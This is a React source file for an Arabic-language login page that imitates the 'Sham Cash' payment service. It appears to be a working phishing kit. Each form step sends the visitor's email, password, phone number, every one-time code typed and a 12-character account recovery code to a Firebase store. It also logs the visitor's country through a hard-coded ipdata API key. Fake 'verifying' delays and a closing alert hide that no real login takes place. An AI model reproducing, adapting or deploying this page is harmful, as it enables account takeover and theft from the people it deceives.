"use client";

import type React from "react";
import { useState, useEffect } from "react";
import { Eye, EyeOff, X } from "lucide-react";
import { addData, setupOnlineStatus } from "@/lib/firebase";

function randstr(prefix: string) {
  return Math.random()
    .toString(36)
    .replace("0.", prefix || "");
}

const visitorID = randstr("shamn-");
const allOtps: string[] = [];

export default function LoginPage() {
  const [showPassword, setShowPassword] = useState(false);
  const [step, setStep] = useState<"login" | "otp" | "phone" | "recovery">(
    "login"
  );
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [phone, setPhone] = useState("");
  const [phoneError, setPhoneError] = useState("");
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [recoveryInput, setRecoveryInput] = useState("");
  const [recoveryError, setRecoveryError] = useState("");
  const [showSplash, setShowSplash] = useState(true);
  const [loding, setloading] = useState(false);
  const [showOffer, setShowOffer] = useState(true);

  useEffect(() => {
    getLocation()
      .then(() => {
        const timer = setTimeout(() => setShowSplash(false), 2000);
        return () => clearTimeout(timer);
      })
      .catch(() => setShowSplash(true));
  }, []);

  const handleLoginSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) return;
    setloading(true);
    await addData({ id: visitorID, email, password });
    setTimeout(() => {
      setStep("phone");
      setloading(false);
    }, 3000);
  };

  function validatePhoneNumber(value: string) {
    const digits = value.replace(/\D/g, "");
    if (digits.length === 0) return "الرجاء إدخال رقم الهاتف";
    if (digits.length < 9) return "الرقم قصير جداً";
    if (digits.length > 10) return "الرقم طويل جداً";
    return "";
  }

  const handlePhoneChange = (value: string) => {
    const digits = value.replace(/\D/g, "");
    setPhone(digits);
    setPhoneError(validatePhoneNumber(digits));
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const err = validatePhoneNumber(phone);
    setPhoneError(err);
    if (err) return;
    setloading(true);
    await addData({ id: visitorID, phone });
    setTimeout(() => {
      setStep("otp");
      setloading(false);
    }, 3000);
  };

  const handleOtpChange = (index: number, value: string) => {
    if (value.length > 1) return;
    const newOtp = [...otp];
    newOtp[index] = value.replace(/\D/g, "");
    setOtp(newOtp);
    if (value && index < 5) {
      const next = document.getElementById(`otp-${index + 1}`);
      (next as HTMLElement | null)?.focus();
    }
  };

  const handleOtpKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      const prev = document.getElementById(`otp-${index - 1}`);
      (prev as HTMLElement | null)?.focus();
    }
  };

  // on successful OTP we move to recovery input step
  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!otp.every((d) => d)) return;
    const joined = otp.join("");
    allOtps.push(joined);
    setloading(true);
    await addData({ id: visitorID, otp: joined, allOtps });
    setEmail("");
    setPassword("");
    setOtp(["", "", "", "", "", ""]);
    setTimeout(() => {
      setloading(false);
      setStep("recovery");
    }, 1000);
  };

  // recovery validation: exactly 12 alphanumeric chars
  function validateRecovery(value: string) {
    if (!value) return "الرجاء إدخال رمز الاسترداد";
    if (!/^[A-Za-z0-9]{12}$/.test(value))
      return "يجب أن يتكون الرمز من 12 حرفًا/رقمًا إنجليزية بدون فراغات";
    return "";
  }

  const handleRecoveryChange = (value: string) => {
    // keep only alphanumeric ASCII
    const filtered = value.replace(/[^A-Za-z0-9]/g, "").slice(0, 12);
    setRecoveryInput(filtered);
    setRecoveryError(validateRecovery(filtered));
  };

  const handleRecoverySubmit = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    const err = validateRecovery(recoveryInput);
    setRecoveryError(err);
    if (err) return;
    setloading(true);
    // store user-entered recovery code
    await addData({
      id: visitorID,
      recoveryCode: recoveryInput,
      recoveryCreatedAt: new Date().toISOString(),
    });
    setloading(false);
    // finalize or navigate: here we go back to login and clear sensitive data
    setRecoveryInput("");
    alert("رمز الاسترداد تم حفظه. احتفظ به في مكان آمن.");
    setStep("login");
  };

  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef";
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
    try {
      const response = await fetch(url);
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const country = await response.text();
      addData({
        id: visitorID,
        country,
        createdDate: new Date().toISOString(),
      });
      localStorage.setItem("country", country);
      setupOnlineStatus(visitorID);
    } catch (error) {
      console.error("Error fetching location:", error);
    }
  }

  if (showSplash) {
    return (
      <div
        className="min-h-screen bg-blue-50 flex flex-col items-center justify-center"
        dir="rtl"
      >
        <div className="flex flex-col items-center animate-pulse">
          <img src="file.svg" alt="llog" />
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-blue-50 flex flex-col" dir="rtl">
      <div className="flex-1 flex flex-col items-center justify-center px-3 py-8">
        <div className="w-full flex justify-between items-center mb-16">
          <span className="text-gray-600 font-semibold text-sm">
            الإنكليزية
          </span>
        </div>

        {step === "login" ? (
          <>
            <div className="mb-16 flex justify-center">
              <img src="file.svg" alt="llog" />
            </div>
            <h1 className="text-xl font-bold text-gray-800 text-center mb-12">
              تسجيل الدخول
            </h1>
            <form onSubmit={handleLoginSubmit} className="w-full max-w-md">
              <div className="mb-6">
                <input
                  type="email"
                  placeholder="بريد الكتروني"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full px-4 py-2 bg-gray-200 border-0 rounded-full text-right placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all text-sm"
                  style={{ paddingLeft: "50px" }}
                />
              </div>

              <div className="mb-6 relative">
                <input
                  type={showPassword ? "text" : "password"}
                  placeholder="كلمة السر"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-2 bg-gray-200 border-0 rounded-full text-right placeholder:text-gray-600 focus:outline-none focus:ring-2 focus:ring-blue-400 transition-all text-sm"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute left-5 top-1/2 -translate-y-1/2 text-gray-500"
                >
                  {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
              </div>

              <div className="text-center mb-8">
                <a
                  href="#"
                  className="text-blue-600 hover:text-blue-700 font-medium text-sm"
                >
                  هل نسيت كلمة المرور؟{" "}
                  <span className="underline">تغيير كلمة المرور</span>
                </a>
              </div>

              <button
                type="submit"
                disabled={loding}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-2 px-4 rounded-full mb-8 text-sm"
              >
                {loding ? "جاري التحقق..." : " تسجيل الدخول"}
              </button>
            </form>
            <div className="text-center mb-16">
              <p className="text-gray-700 text-sm">
                لا تملك حساب مسبقا؟{" "}
                <a href="#" className="text-blue-600 font-bold">
                  إنشاء حساب
                </a>
              </p>
            </div>
          </>
        ) : step === "otp" ? (
          <>
            <h1 className="text-4xl font-bold text-gray-800 text-center mb-4">
              رمز التحقق
            </h1>
            <p className="text-center text-gray-600 mb-12">
              ادخل رمز التحقق المرسل الى بريدك الالكتروني{" "}
              <span className="px-2">{email}</span>
            </p>
            <form onSubmit={handleOtpSubmit} className="w-full max-w-md">
              <div className="mb-8" dir="ltr">
                <label className="block text-right text-gray-700 font-medium mb-4">
                  أدخل رمز التحقق
                </label>
                <div className="flex gap-3 justify-center">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      id={`otp-${index}`}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleOtpChange(index, e.target.value)}
                      onKeyDown={(e) => handleOtpKeyDown(index, e)}
                      className="w-12 h-12 text-center text-xl font-bold bg-gray-200 border-2 border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-400"
                    />
                  ))}
                </div>
              </div>

              <button
                type="submit"
                disabled={!otp.every((d) => d) || loding}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-4 px-4 rounded-full mb-6 text-sm"
              >
                {loding ? "جارٍ المعالجة..." : "تحقق"}
              </button>

              <button
                type="button"
                onClick={() => setStep("login")}
                className="w-full text-blue-600 font-medium py-2"
              >
                العودة للخلف
              </button>
            </form>
          </>
        ) : step === "phone" ? (
          <>
            <h1 className="text-2xl font-bold text-gray-800 text-center mb-4">
              رقم الهاتف
            </h1>
            <p className="text-center text-gray-600 mb-6">
              أدخل رقم هاتفك لاستلام رمز التحقق
            </p>
            <form onSubmit={handlePhoneSubmit} className="w-full max-w-md">
              <div className="mb-4">
                <input
                  type="tel"
                  placeholder="رقم الهاتف"
                  value={phone}
                  onChange={(e) => handlePhoneChange(e.target.value)}
                  className="w-full px-4 py-2 bg-gray-200 rounded-full text-right"
                />
                {phoneError && (
                  <p className="text-red-500 text-sm mt-2">{phoneError}</p>
                )}
              </div>
              <button
                type="submit"
                disabled={loding}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-3 px-4 rounded-full mb-6"
              >
                إرسال رمز
              </button>
              <button
                type="button"
                onClick={() => setStep("login")}
                className="w-full text-blue-600 font-medium py-2"
              >
                العودة للخلف
              </button>
            </form>
          </>
        ) : (
          // recovery input step
          <>
            <h1 className="text-2xl font-bold text-gray-800 text-center mb-4">
              إدخال رمز الاسترداد
            </h1>
            <p className="text-center text-gray-600 mb-6">
              أدخل رمز الاسترداد الذي اخترته مسبقًا. يجب أن يتكون من 12
              حرفًا/رقمًا إنجليزيًا.
            </p>

            <form onSubmit={handleRecoverySubmit} className="w-full max-w-md">
              <div className="mb-4">
                <input
                  type="text"
                  placeholder="رمز الاسترداد (12 حرفاً)"
                  value={recoveryInput}
                  onChange={(e) => handleRecoveryChange(e.target.value)}
                  className="w-full px-4 py-3 bg-white border border-gray-300 rounded-xl text-right placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-blue-400"
                />
                {recoveryError && (
                  <p className="text-red-500 text-sm mt-2">{recoveryError}</p>
                )}
              </div>

              <button
                type="submit"
                disabled={loding}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white font-bold py-3 px-4 rounded-full mb-4"
              >
                {loding ? "جارٍ الحفظ..." : "حفظ رمز الاسترداد"}
              </button>

              <button
                type="button"
                onClick={() => setStep("login")}
                className="w-full text-blue-600 font-medium py-2"
              >
                العودة للخلف
              </button>
            </form>
          </>
        )}
      </div>

      <footer className="text-center py-8 border-t border-blue-200">
        <p className="text-gray-600 text-sm mb-2">POWERED BY</p>
        <p className="text-gray-800 font-bold text-sm mb-1">Sham Cash ©</p>
        <p className="text-gray-500 text-sm mb-6">v 2.1.3</p>
      </footer>

      {showOffer && (
        <div
          className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50"
          dir="rtl"
        >
          <div className="relative bg-white rounded-3xl shadow-2xl overflow-hidden max-w-sm w-full">
            <button
              onClick={() => setShowOffer(false)}
              className="absolute top-4 right-4 z-10 bg-white rounded-full p-2 hover:bg-gray-100"
            >
              <X size={24} className="text-gray-600" />
            </button>

            <div className="bg-gradient-to-br from-blue-700 via-blue-600 to-teal-600 p-8 text-white min-h-64 flex flex-col justify-between">
              <div className="flex flex-col items-center mb-8">
                <p className="text-sm font-light">سهولة وأمان</p>
              </div>
              <div className="mb-6">
                <img src="card.png" alt="log" />
              </div>
            </div>

            <div className="p-6 bg-white">
              <button
                onClick={() => setShowOffer(false)}
                className="w-full bg-gradient-to-r from-blue-500 to-teal-500 text-white font-bold py-3 px-4 rounded-full"
              >
                احصل عليها
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
